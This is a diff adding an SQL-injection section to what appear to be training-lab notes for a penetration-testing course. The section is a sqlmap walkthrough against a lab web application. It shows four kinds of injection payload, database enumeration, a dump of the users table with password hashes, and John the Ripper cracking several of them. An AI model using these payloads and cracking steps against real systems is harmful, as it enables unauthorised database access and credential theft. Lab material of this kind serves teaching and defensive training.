@@ -215,5 +215,75 @@ Press Ctrl-C to quit.
 
 ## 4.6 SQL Injection (SQLMap)
 
+```bash
+sec504@slingshot:~$ sqlmap -u "http://rookaviary.com/email_search.php?search=" --dbs
+
+---
+Parameter: search (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: search=-8101' OR 4547=4547#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: search=' AND (SELECT 1142 FROM(SELECT COUNT(*),CONCAT(0x71626b7171,(SELECT (ELT(1142=1142,1))),0x7176707171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- gDQV
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: search=' AND (SELECT 9695 FROM (SELECT(SLEEP(5)))NkRg)-- oFYJ
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: search=' UNION ALL SELECT CONCAT(0x71626b7171,0x49526e504e565a417a55786a536a4d656b4568786e4f6351486c7a44524e456851677a43496f5349,0x7176707171),NULL#
+---
+[03:21:12] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.20.1, PHP 7.4.22
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[03:21:12] [INFO] fetching database names
+available databases [3]:
+[*] information_schema
+[*] test
+[*] web_app
+...
+# Found the following with --tables
++----------+
+| comments |
+| users    |
++----------+
+
+# After using flags to get the tables and columns...
+sec504@slingshot:~$ sqlmap -u "http://rookaviary.com/email_search.php?search=" -D web_app -T users --dump
+
++----+---------------------+-------------+-------------------------------------------+-------------------+
+| id | email               | username    | password                                  | full_name         |
++----+---------------------+-------------+-------------------------------------------+-------------------+
+| 01 | josh@ras.tgt        | josh        | *86E12C1588C9A8300E519FF9190CF464BDB0F9DD | Joshua Wright     |
+| 02 | r00k@ras.tgt        | admin       | *47FA7B070774F637F4D6D6D0B97779EBA27A37CE | Derek Rook        |
+| 03 | jleytevidal@ras.tgt | jleytevidal | *38030A5A56F0473F5FBB5F6A51AD6EF94A34603D | James Leyte-Vidal |
+| 04 | mdouglas@ras.tgt    | mdouglas    | *38905DA3545297B3E9A96456E4985DAA0C82B84E | Mick Douglas      |
+| 05 | ssims@ras.tgt       | ssims       | *CAF46A02F9F591E00A521BA45598E3A5E03058F5 | Steve Sims        |
+| 06 | rogrady@ras.tgt     | rogrady     | *DDBF75D02D1D212128C61E35695EDEBA792C3E66 | Ryan O\x1bGrady   |
++----+---------------------+-------------+-------------------------------------------+-------------------+
+
+# Use john to crack the passes recovered from the db.
+john /tmp/sqlmapmdAHnx3702/sqlmaphashes-cfmjTN.txt
+
+roceeding with wordlist:/usr/local/share/john/password.lst
+Florida1         (jleytevidal)     
+Proceeding with incremental:ASCII
+corvid           (admin)   
+
+# Also found ssims
+john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/sqlmapmdAHnx3702/sqlmaphashes-cfmjTN.txt
+
+RockYou          (ssims)   
+```
+
+![sqli1](img/lab4/rook2.PNG)
+
+Sample SQLMap results:
+
+![SQLMap1](img/lab4/rook3.PNG)
 
 ## 4.7 Cloud SSRF and IMDS Attack
+
